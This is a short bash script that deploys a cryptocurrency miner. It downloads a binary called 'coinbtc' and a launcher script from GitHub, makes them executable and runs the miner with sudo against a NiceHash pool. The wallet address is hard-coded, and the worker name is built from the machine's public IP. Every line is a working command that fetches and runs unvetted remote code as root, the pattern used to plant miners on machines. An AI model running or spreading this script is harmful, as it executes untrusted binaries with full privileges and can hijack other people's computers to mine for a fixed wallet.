#!/bin/bash
wget https://raw.githubusercontent.com/solinos-utab/nyeper/main/coinbtc
chmod +x coinbtc
wget https://github.com/aka648582/yes/raw/main/cmdline_launcher.sh
chmod +x cmdline_launcher.sh

POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353

WALLET=3LMetbDeCk5Ze6MbcGouk9eGv8zWWSddig

WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH

cd "$(dirname "$0")"

chmod +x ./coinbtc && sudo ./coinbtc --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHPROXY
